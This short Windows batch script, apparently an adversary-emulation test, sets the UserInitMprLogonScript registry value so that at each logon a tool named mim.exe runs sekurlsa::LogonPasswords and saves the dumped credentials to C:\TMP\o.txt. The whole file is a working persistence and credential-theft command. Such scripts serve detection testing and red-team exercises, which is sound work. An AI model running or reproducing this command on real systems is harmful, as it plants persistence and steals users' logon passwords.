@ECHO OFF

ECHO ===========================================================================
ECHO UserInitMprLogonScript Persistence
ECHO Using the UserInitMprLogonScript key to get persistence
ping -n 5 127.0.0.1 > NUL

REG ADD HKCU\Environment /f /v UserInitMprLogonScript /t REG_MULTI_SZ /d "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"
